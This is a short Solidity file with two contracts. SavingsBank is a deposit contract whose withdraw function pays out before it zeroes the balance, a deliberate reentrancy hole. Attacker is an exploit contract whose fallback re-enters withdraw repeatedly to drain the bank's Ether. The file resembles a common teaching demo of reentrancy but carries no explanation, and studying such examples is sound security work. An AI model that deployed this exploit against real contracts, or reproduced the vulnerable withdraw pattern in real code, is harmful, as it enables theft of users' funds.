contract SavingsBank {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}



import "./SavingsBank.sol";
contract Attacker{

    SavingsBank public attackSavebank;
    
    constructor (address _savebank){
        attackSavebank=SavingsBank(_savebank);

    }

    fallback() external payable{
        if(address(attackSavebank).balance>= 1 ether)
attackSavebank.withdraw();

    }

    function attack() external payable{
        if(msg.value>= 1 ether)
        {
            attackSavebank.deposit{value: 1 ether}();
            attackSavebank.withdraw();
        }
    }
}

